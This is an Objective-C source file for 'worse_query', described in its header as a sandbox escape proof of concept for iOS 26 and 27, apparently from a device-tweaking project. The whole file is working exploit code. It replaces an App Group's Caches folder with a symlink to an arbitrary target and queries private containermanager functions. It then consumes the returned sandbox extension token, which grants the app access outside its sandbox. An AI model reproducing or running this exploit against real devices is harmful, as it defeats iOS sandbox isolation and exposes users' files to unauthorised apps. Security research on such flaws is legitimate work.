//
//  worse_query.m
//  GestaltTweak
//
//  Created by Taj C on 8/20/26.
//  forcequitOS/worse_query
//

/*
     worse_query - A sandbox escape PoC for iOS 26 and 27, again.
     Copyright (C) 2026 Taj C (forcequit)

     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation, either version 3 of the License, or
     (at your option) any later version.

     This program is distributed in the hope that it will be useful,
     but WITHOUT ANY WARRANTY; without even the implied warranty of
     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
     GNU General Public License for more details.

     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#import <Foundation/Foundation.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <xpc/xpc.h>
#include <sys/stat.h>
#include "worse_query.h"

typedef void *(*container_query_create_fn)(void);
typedef void (*container_query_set_class_fn)(void *, uint64_t);
typedef void (*container_query_set_identifiers_fn)(void *, xpc_object_t);
typedef void (*container_query_set_flags_fn)(void *, uint64_t);
typedef void (*container_query_set_part_fn)(void *, uint64_t);
typedef void *(*container_query_get_single_result_fn)(void *);
typedef void (*container_query_free_fn)(void *);
typedef char *(*container_copy_sandbox_token_fn)(void *);
typedef int64_t (*sandbox_extension_consume_fn)(const char *);
typedef int (*sandbox_extension_release_fn)(int64_t);

bool worse_query_available(void) {
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return false;
    void *query_create = dlsym(mgr, "container_query_create");
    void *consume_extension = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    dlclose(mgr);
    return (query_create != NULL && consume_extension != NULL);
}

// Remove symlink and recreate Caches directory
static void clean_symlink(NSString *group) {
    if (group != nil) {
        NSFileManager *files = [NSFileManager defaultManager];
        NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: group];
        if (groupRoot) {
            NSURL *caches = [groupRoot URLByAppendingPathComponent: @"Library/Caches"];
            [files removeItemAtURL: caches error: nil];
            [files createDirectoryAtURL: caches withIntermediateDirectories: true attributes: nil error: nil];
        }
    }
}

// worse_query sandbox escape
int64_t worse_query(NSString *target, NSString *group, bool alt_flags, bool create_dir) {
    // Check if the target exists
    if (!create_dir) {
        struct stat st;
        if (lstat(target.fileSystemRepresentation, &st) != 0) return -255;
    }
    
    // Ensure group starts with "group."
    NSString *cleanGroup = group;
    if (cleanGroup.length > 0 && ![cleanGroup hasPrefix:@"group."]) {
        cleanGroup = [@"group." stringByAppendingString:cleanGroup];
    }
    
    // Get the App Group's path
    NSFileManager *files = [NSFileManager defaultManager];
    NSURL *groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: cleanGroup];
    if (!groupRoot) {
        // Fallback to checking alternative identifiers
        NSArray<NSString *> *fallbacks = @[@"group.cc.forcequit.worse-query", @"group.com.gestalttweak.app"];
        for (NSString *fb in fallbacks) {
            groupRoot = [files containerURLForSecurityApplicationGroupIdentifier: fb];
            if (groupRoot) {
                cleanGroup = fb;
                break;
            }
        }
    }
    if (!groupRoot) return -1; // App Group doesn't exist or we can't access it
    
    NSURL *libraryURL = [groupRoot URLByAppendingPathComponent:@"Library"];
    if (![files fileExistsAtPath:libraryURL.path]) {
        [files createDirectoryAtURL:libraryURL withIntermediateDirectories:YES attributes:nil error:nil];
    }
    
    NSString *caches = [[groupRoot URLByAppendingPathComponent: @"Library/Caches"] path];
    
    // Resolve functions
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) return -2;
    
    container_query_create_fn query_create = (container_query_create_fn)dlsym(mgr, "container_query_create");
    container_query_set_class_fn query_set_class = (container_query_set_class_fn)dlsym(mgr, "container_query_set_class");
    container_query_set_identifiers_fn query_set_group_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_group_identifiers");
    container_query_set_identifiers_fn query_set_identifiers = (container_query_set_identifiers_fn)dlsym(mgr, "container_query_set_identifiers");
    container_query_set_flags_fn query_set_flags = (container_query_set_flags_fn)dlsym(mgr, "container_query_operation_set_flags");
    container_query_set_part_fn query_set_part = (container_query_set_part_fn)dlsym(mgr, "container_query_operation_set_part");
    container_query_get_single_result_fn query_get_single_result = (container_query_get_single_result_fn)dlsym(mgr, "container_query_get_single_result");
    container_query_free_fn query_free = (container_query_free_fn)dlsym(mgr, "container_query_free");
    container_copy_sandbox_token_fn copy_sandbox_token = (container_copy_sandbox_token_fn)dlsym(mgr, "container_copy_sandbox_token");
    sandbox_extension_consume_fn consume_extension = (sandbox_extension_consume_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    
    if (!query_create || !query_set_class || (!query_set_group_identifiers && !query_set_identifiers) ||
        !query_set_flags || !query_set_part || !query_get_single_result || !query_free ||
        !copy_sandbox_token || !consume_extension) {
        dlclose(mgr);
        return -2;
    }
    
    // Set up symlink
    [files removeItemAtPath: caches error: nil];
    if ([files createSymbolicLinkAtPath: caches withDestinationPath: target error: nil] == false) {
        dlclose(mgr);
        return -4;
    }
    
    uint64_t flags = alt_flags ? 0x0000000800000000ULL : 0x0000008000000000ULL;
    void *result = NULL;
    void *successfulQuery = NULL;
    
    // Permutation of query setups: string vs array identifiers, group_identifiers vs identifiers
    for (int variant = 0; variant < 4 && result == NULL; variant++) {
        void *query = query_create();
        if (!query) continue;
        
        query_set_class(query, 7);
        query_set_part(query, 3);
        query_set_flags(query, flags);
        
        xpc_object_t idObj = NULL;
        if (variant % 2 == 0) {
            idObj = xpc_string_create(cleanGroup.UTF8String);
        } else {
            idObj = xpc_array_create(nil, 0);
            xpc_array_set_string(idObj, XPC_ARRAY_APPEND, cleanGroup.UTF8String);
        }
        
        if (variant < 2 && query_set_group_identifiers) {
            query_set_group_identifiers(query, idObj);
        } else if (query_set_identifiers) {
            query_set_identifiers(query, idObj);
        } else if (query_set_group_identifiers) {
            query_set_group_identifiers(query, idObj);
        }
        
#if !OS_OBJECT_USE_OBJC
        xpc_release(idObj);
#endif
        
        result = query_get_single_result(query);
        if (result) {
            successfulQuery = query;
            break;
        } else {
            query_free(query);
        }
    }
    
    if (!result) {
        dlclose(mgr);
        clean_symlink(cleanGroup);
        return -5; // Query rejected by containermanagerd
    }
    
    char *token = copy_sandbox_token(result);
    if (!token) {
        query_free(successfulQuery);
        dlclose(mgr);
        clean_symlink(cleanGroup);
        return -6;
    }
    
    int64_t handle = consume_extension(token);
    query_free(successfulQuery);
    free(token);
    dlclose(mgr);
    clean_symlink(cleanGroup);
    
    return handle;
}

void worse_query_release(int64_t handle) {
    if (handle < 0) return;
    sandbox_extension_release_fn release_extension = (sandbox_extension_release_fn)dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (release_extension) release_extension(handle);
}
